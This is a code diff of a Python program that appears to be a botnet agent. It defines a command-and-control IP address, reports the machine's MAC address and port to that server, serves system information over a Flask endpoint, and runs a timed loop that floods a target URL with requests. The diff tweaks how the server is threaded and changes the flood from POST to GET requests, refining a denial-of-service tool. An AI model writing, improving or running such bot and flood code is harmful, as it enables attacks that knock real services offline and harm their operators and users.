@@ -14,7 +14,7 @@ cnc_ip = '10.0.2.15'
 def main():
     port = getFreePort()
     server = FlaskServer(port)
-    threading.Thread(target=lambda: server.run()).start()
+    server.run()
     body = {}
     body['mac-address'] = getMacAddress()
     body['running-port'] = port
@@ -45,7 +45,7 @@ class FlaskServer:
 
     def run(self):
         server = make_server('0.0.0.0', self.port, self.app)
-        self.app.run(host="0.0.0.0", threaded = True, debug = False, use_reloader = False)
+        threading.Thread(target = lambda: server.serve_forever()).start()
 
     @app.route('/systeminfo', methods = ['GET'])
     def getSystemInfo():
@@ -72,7 +72,7 @@ class FlaskServer:
         start_time = time.time()
         while time.time() - start_time < timeSeconds:
             try:
-                requests.post(url, json={}, timeout=5)
+                requests.get(url, timeout=5)
             except Exception:
                 pass
 
